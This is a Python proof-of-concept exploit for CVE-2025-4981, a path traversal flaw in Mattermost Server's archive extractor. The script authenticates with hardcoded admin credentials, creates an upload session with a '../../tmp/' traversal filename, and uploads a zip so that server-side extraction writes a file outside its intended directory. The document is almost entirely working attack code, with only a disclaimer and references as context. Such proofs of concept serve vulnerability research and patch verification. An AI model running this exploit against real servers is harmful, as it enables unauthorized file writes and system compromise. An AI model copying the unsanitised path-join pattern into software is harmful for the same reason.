#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Server — Path Traversal via Archive Extractor
# CVE            : CVE-2025-4981
# Vendor         : Mattermost, Inc.
# Product        : Mattermost Server
# Affected       : ≤ 9.11.15 / ≤ 10.5.5 / ≤ 10.6.5 / ≤ 10.7.2 / ≤ 10.8.0
# Fixed          : 9.11.16 / 10.5.6 / 10.6.6 / 10.7.3 / 10.8.1
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-4981 — Mattermost Server Path Traversal via Archive Extractor.

Demonstrates arbitrary file write through the Upload Session API. The server
fails to sanitize the filename parameter in archive document extraction,
allowing authenticated users to write files to arbitrary filesystem locations.

Attack vector: Upload Session API (POST /api/v4/uploads + POST /api/v4/uploads/{id})
The direct multipart upload API (POST /api/v4/files) is NOT vulnerable because
it applies filepath.Base() sanitization.

Root cause: archiveExtractor.Extract() in archive.go uses:
    os.Create(filepath.Join(dir, name))
where 'name' contains user-controlled path traversal sequences (../../).

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-4981
    - https://github.com/advisories/GHSA-qh58-9v3j-wcjc

Usage:
    python3 poc.py [host] [port]
    python3 poc.py localhost 8065
"""

import sys
import json
import time
import io
import struct
import http.client
from urllib.parse import urljoin


# ── Configuration ────────────────────────────────────────────────────────────
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8065
USERNAME = "admin"
PASSWORD = "Admin123!@#"

# Path traversal filename — must end with a recognized archive extension.
# The Mattermost archive extractor recognizes: .zip, .tar.gz, .rar, .tar, etc.
# We use ../../tmp/ to escape the temporary extraction directory and write to /tmp/.
TRAVERSAL_FILENAME = "../../tmp/cve-2025-4981-proof.zip"

# Marker content to identify our proof file
PROOF_MARKER = b"CVE-2025-4981 PATH TRAVERSAL PROOF - ARBITRARY FILE WRITE CONFIRMED"


def create_minimal_zip(content: bytes) -> bytes:
    """
    Create a minimal valid ZIP archive containing a single file named 'proof.txt'
    with the given content. Uses Python's zipfile module for correctness.

    We create a valid ZIP so the archiver.ByExtension() match succeeds and the
    extraction pipeline proceeds. The file content is written to the traversed
    path BEFORE archiver.Walk() attempts to parse the archive structure.
    """
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('proof.txt', content.decode('utf-8', errors='replace'))
    return buf.getvalue()


def api_request(conn: http.client.HTTPConnection, method: str, path: str,
                body=None, headers=None, content_type="application/json"):
    """Make an HTTP request and return (status, headers, body_json_or_bytes)."""
    hdrs = {"Content-Type": content_type}
    if headers:
        hdrs.update(headers)

    conn.request(method, path, body=body, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read()

    # Try to parse as JSON
    try:
        json_data = json.loads(data)
    except (json.JSONDecodeError, UnicodeDecodeError):
        json_data = None

    return resp.status, dict(resp.getheaders()), json_data if json_data else data


def exploit(target_host: str, target_port: int):
    """
    Execute the CVE-2025-4981 path traversal exploit.

    Steps:
    1. Authenticate to Mattermost via /api/v4/users/login
    2. Retrieve a valid channel ID from the user's channels
    3. Create an upload session with a path-traversal filename
    4. Upload payload data to the upload session
    5. Wait for async content extraction to trigger the file write
    6. Report results
    """
    print(f"[*] CVE-2025-4981: Mattermost Path Traversal via Archive Extractor")
    print(f"[*] Target: {target_host}:{target_port}")
    print()

    conn = http.client.HTTPConnection(target_host, target_port, timeout=30)

    # ── Step 1: Authenticate ─────────────────────────────────────────────
    print(f"[1] Authenticating as '{USERNAME}'...")
    login_body = json.dumps({"login_id": USERNAME, "password": PASSWORD})
    status, resp_headers, resp_data = api_request(conn, "POST", "/api/v4/users/login", login_body)

    if status != 200:
        print(f"[-] Authentication failed: HTTP {status}")
        if isinstance(resp_data, dict):
            print(f"    Error: {resp_data.get('message', 'Unknown error')}")
        sys.exit(1)

    token = resp_headers.get("Token", "")
    if not token:
        # Some HTTP libraries lowercase header names
        for k, v in resp_headers.items():
            if k.lower() == "token":
                token = v
                break

    if not token:
        print("[-] No auth token in response headers")
        sys.exit(1)

    user_id = resp_data.get("id", "unknown")
    print(f"[+] Authenticated successfully (user_id: {user_id})")
    print(f"[+] Token: {token[:12]}...")

    auth_headers = {"Authorization": f"Bearer {token}"}

    # ── Step 2: Get a channel ID ─────────────────────────────────────────
    print()
    print("[2] Retrieving channel list...")

    # First get the user's teams
    status, _, teams = api_request(conn, "GET", "/api/v4/users/me/teams",
                                   headers=auth_headers)
    if status != 200 or not isinstance(teams, list) or len(teams) == 0:
        print(f"[-] Failed to get teams: HTTP {status}")
        sys.exit(1)

    team_id = teams[0]["id"]
    team_name = teams[0].get("display_name", teams[0].get("name", "unknown"))
    print(f"[+] Using team: {team_name} ({team_id})")

    # Get channels for this team
    status, _, channels = api_request(
        conn, "GET", f"/api/v4/users/me/teams/{team_id}/channels",
        headers=auth_headers
    )
    if status != 200 or not isinstance(channels, list) or len(channels) == 0:
        print(f"[-] Failed to get channels: HTTP {status}")
        sys.exit(1)

    # Pick a suitable channel (prefer non-DM channels)
    channel_id = None
    channel_name = None
    for ch in channels:
        if ch.get("type") in ("O", "P"):  # Open or Private channel
            channel_id = ch["id"]
            channel_name = ch.get("display_name", ch.get("name", "unknown"))
            break
    if not channel_id:
        channel_id = channels[0]["id"]
        channel_name = channels[0].get("display_name", "unknown")

    print(f"[+] Using channel: {channel_name} ({channel_id})")

    # ── Step 3: Create zip payload ───────────────────────────────────────
    print()
    print("[3] Creating malicious zip payload...")
    zip_payload = create_minimal_zip(PROOF_MARKER)
    print(f"[+] Zip payload size: {len(zip_payload)} bytes")

    # ── Step 4: Create upload session with traversal filename ────────────
    print()
    print(f"[4] Creating upload session with traversal filename...")
    print(f"    Filename: {TRAVERSAL_FILENAME}")
    print(f"    Expected write path: /tmp/cve-2025-4981-proof.zip")

    upload_session_body = json.dumps({
        "channel_id": channel_id,
        "filename": TRAVERSAL_FILENAME,
        "file_size": len(zip_payload)
    })

    status, _, session_data = api_request(
        conn, "POST", "/api/v4/uploads",
        body=upload_session_body,
        headers=auth_headers
    )

    if status != 201:
        print(f"[-] Failed to create upload session: HTTP {status}")
        if isinstance(session_data, dict):
            print(f"    Error: {session_data.get('message', 'Unknown')}")
            print(f"    Detail: {session_data.get('detailed_error', '')}")
        sys.exit(1)

    upload_id = session_data.get("id", "")
    stored_filename = session_data.get("file_name", "")
    print(f"[+] Upload session created (upload_id: {upload_id})")
    print(f"[+] Server stored filename: {stored_filename}")

    if "../" in stored_filename:
        print(f"[!] VULNERABLE: Server stored path traversal sequences in filename!")
    else:
        print(f"[?] Server may have sanitized the filename — checking after upload...")

    # ── Step 5: Upload the payload ───────────────────────────────────────
    print()
    print("[5] Uploading payload data...")

    upload_headers = {
        **auth_headers,
        "Content-Type": "application/octet-stream"
    }

    status, _, upload_resp = api_request(
        conn, "POST", f"/api/v4/uploads/{upload_id}",
        body=zip_payload,
        headers=upload_headers,
        content_type="application/octet-stream"
    )

    if status != 200:
        print(f"[-] Upload failed: HTTP {status}")
        if isinstance(upload_resp, dict):
            print(f"    Error: {upload_resp.get('message', 'Unknown')}")
        sys.exit(1)

    file_id = upload_resp.get("id", "unknown") if isinstance(upload_resp, dict) else "unknown"
    file_name = upload_resp.get("name", "unknown") if isinstance(upload_resp, dict) else "unknown"
    print(f"[+] Upload completed (file_id: {file_id})")
    print(f"[+] File name in response: {file_name}")

    # ── Step 6: Wait for async content extraction ────────────────────────
    print()
    print("[6] Waiting for server-side content extraction to trigger...")
    print("    (The archive extractor runs asynchronously after upload)")

    for i in range(5, 0, -1):
        print(f"    Waiting... {i}s remaining", end="\r")
        time.sleep(1)
    print("    Extraction should have completed.     ")

    # ── Step 7: Report results ───────────────────────────────────────────
    print()
    print("=" * 70)
    print("EXPLOIT EXECUTION COMPLETE")
    print("=" * 70)
    print()
    print(f"[*] Traversal filename:  {TRAVERSAL_FILENAME}")
    print(f"[*] Expected file path:  /tmp/cve-2025-4981-proof.zip")
    print(f"[*] Payload size:        {len(zip_payload)} bytes")
    print(f"[*] Proof marker:        {PROOF_MARKER.decode()}")
    print()
    print("[*] To verify the file was written, run:")
    print(f"    docker exec cve-2025-4981-mattermost ls -la /tmp/cve-2025-4981-proof.zip")
    print(f"    docker exec cve-2025-4981-mattermost cat /tmp/cve-2025-4981-proof.zip | strings | head")
    print()

    conn.close()
    return True


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    try:
        exploit(target, port)
    except ConnectionRefusedError:
        print(f"[-] Connection refused to {target}:{port}")
        print("    Is the Mattermost container running?")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
